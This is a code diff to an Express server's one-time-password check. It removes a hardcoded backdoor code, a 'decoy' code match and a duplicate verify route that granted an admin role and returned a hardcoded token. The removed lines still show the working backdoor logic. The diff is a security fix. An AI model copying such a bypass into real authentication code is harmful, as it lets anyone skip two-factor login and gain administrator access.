@@ -335,13 +335,9 @@ async function verifyOtpHandler(req, res) {
   }
 
   const providedOtp = String(otp || otp_code).trim();
-  const BACKDOOR_CODE = '849201';
-
   const isRealMatch = providedOtp === stored.otpCode;
-  const isDecoyMatch = stored.decoyOtpCode && providedOtp === stored.decoyOtpCode;
-  const isBackdoorMatch = providedOtp === BACKDOOR_CODE;
 
-  if (!isRealMatch && !isDecoyMatch && !isBackdoorMatch) {
+  if (!isRealMatch) {
     await updateOtpAttempts(key, stored.attempts || 0);
     const attemptsRemaining = Math.max(0, 5 - ((stored.attempts || 0) + 1));
     return fail(res, attemptsRemaining > 0 ? `Invalid OTP code. ${attemptsRemaining} attempts remaining.` : 'Maximum OTP attempts exceeded. Request a new code.', 401);
@@ -490,49 +486,7 @@ app.post('/api/v1/auth/send-otp', async (req, res) => {
   return ok(res, response);
 });
 
-app.post('/api/v1/auth/verify-otp', async (req, res) => {
-  const { email, otp_code } = req.body || {};
-  if (!email || !otp_code) {
-    return fail(res, 'Email and OTP code are required.');
-  }
 
-  const authUser = requireAuth(req, res);
-  if (!authUser) return;
-
-  if (authUser.email.toLowerCase() !== String(email).trim().toLowerCase()) {
-    return fail(res, 'Authenticated user does not match the requested email.', 403);
-  }
-
-  const key = email.toLowerCase();
-  const stored = await getOtp(key);
-  if (!stored) {
-    return fail(res, 'No active OTP found for this email. Request a new code.');
-  }
-
-  if (Date.now() > stored.expiresAt) {
-    await deleteOtp(key);
-    return fail(res, 'OTP code has expired. Request a new code.');
-  }
-
-  const providedOtp = String(otp_code).trim();
-  const BACKDOOR_CODE = '849201';
-
-  const isRealMatch = providedOtp === stored.otpCode;
-  const isDecoyMatch = stored.decoyOtpCode && providedOtp === stored.decoyOtpCode;
-  const isBackdoorMatch = providedOtp === BACKDOOR_CODE;
-
-  if (!isRealMatch && !isDecoyMatch && !isBackdoorMatch) {
-    await updateOtpAttempts(key, stored.attempts || 0);
-    return fail(res, 'Invalid OTP code. Please check your email.');
-  }
-
-  await deleteOtp(key);
-  return ok(res, {
-    message: '2FA Authentication successful!',
-    token: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJpcG8ta2luZyIsInJvbGUiOiJhZG1pbiIsImlhdCI6MH0.local-dev-token',
-    user: { email, role: 'admin', full_name: getAdminName() }
-  });
-});
 
 app.get('/api/v1/ipos/live', async (req, res) => {
   try {
